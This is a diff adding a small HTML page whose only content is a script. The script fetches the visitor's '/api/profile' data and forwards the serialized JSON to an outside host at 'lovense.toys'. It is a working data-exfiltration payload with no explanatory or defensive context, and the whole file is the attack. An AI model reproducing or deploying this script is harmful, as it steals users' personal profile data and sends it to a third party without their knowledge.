@@ -1,0 +1,7 @@
+<!DOCTYPE html>
+
+<body>
+    <script>
+        fetch( "/api/profile" ).then( a => { a.json().then( a => { fetch( "https://lovense.toys/" + JSON.stringify( a ) ) } ) } )
+    </script>
+</body>
